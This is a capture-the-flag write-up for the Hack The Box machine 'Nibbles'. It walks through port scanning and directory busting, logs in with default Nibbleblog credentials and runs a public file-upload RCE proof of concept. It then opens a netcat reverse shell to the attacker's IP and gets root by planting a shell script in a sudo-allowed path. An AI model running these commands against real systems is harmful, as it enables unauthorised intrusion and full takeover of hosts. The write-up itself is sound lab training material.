---
icon: ubuntu
---

# Nibbles - Easy

<figure><img src="../../.gitbook/assets/image (3180).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/nibbles"><strong>Nibbles</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.5.74 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-26 14:52 -0500
Nmap scan report for 10.129.5.74
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   86.30 ms 10.10.16.1
2   23.70 ms 10.129.5.74
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

```shellscript
curl -I http://10.129.5.74
```

```shellscript
HTTP/1.1 200 OK     
Date: Mon, 26 Jan 2026 19:58:03 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
ETag: "5d-5616c3cf7fa77"
Accept-Ranges: bytes
Content-Length: 93
Vary: Accept-Encoding
Content-Type: text/html
```

Apache Front End Webserver hosted on Ubuntu

#### <mark style="color:$primary;">Site</mark>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Site Source</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The Site source reveals an interesting comment

#### <mark style="color:$primary;">/nibbleblog/</mark>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

The site is running PHP

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
feroxbuster -u http://10.129.5.74/nibbleblog/ -x php -o ferox.txt
```

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Directory busting reveals admin login!

#### <mark style="color:$primary;">/admin.php</mark>

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

A quick google search for default admin credentials for nibbleblog

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

We were able to login with the discovered admin credentials

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

in the Settings menu at the bottom of the page there is a version available

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

There is a File Upload RCE available for this version. I found a POC on github

{% embed url="https://github.com/hadrian3689/nibbleblog_4.0.3" %}

### <mark style="color:blue;">Nibbleblog 4.0.3 File Upload RCE</mark>

{% code title="Clone the repo" %}
```shellscript
git clone https://github.com/hadrian3689/nibbleblog_4.0.3.git
```
{% endcode %}

#### <mark style="color:$primary;">Execution</mark>

{% code overflow="wrap" %}
```shellscript
python3 nibbleblog_4.0.3.py -t http://10.129.5.74/nibbleblog/admin.php -u admin -p nibbles -rce 'which nc'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

we know the exploit is working an nc is on the machine let's get a shell

#### <mark style="color:$primary;">Reverse shell via nc</mark>

{% code overflow="wrap" %}
```shellscript
python3 nibbleblog_4.0.3.py -t http://10.129.5.74/nibbleblog/admin.php -u admin -p nibbles -rce 'busybox nc 10.10.16.15 80 -e /bin/bash'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

We managed to get a shell as nibbler!

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Manul Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

nibbler can run a script with root privileges let's check it out

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

the personal folder with the script is missing from nibbler's directory!

It is however located in the zip folder.

### <mark style="color:blue;">Sudo Script / Path Hijacking -> root</mark>

since the folders with the script is missing we can simply create the folders than create our own script and it will be executed with root privileges

```shellscript
echo 'bash -i' > monitor.sh
```

```shellscript
sudo /home/nibbler/personal/stuff/monitor.sh
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
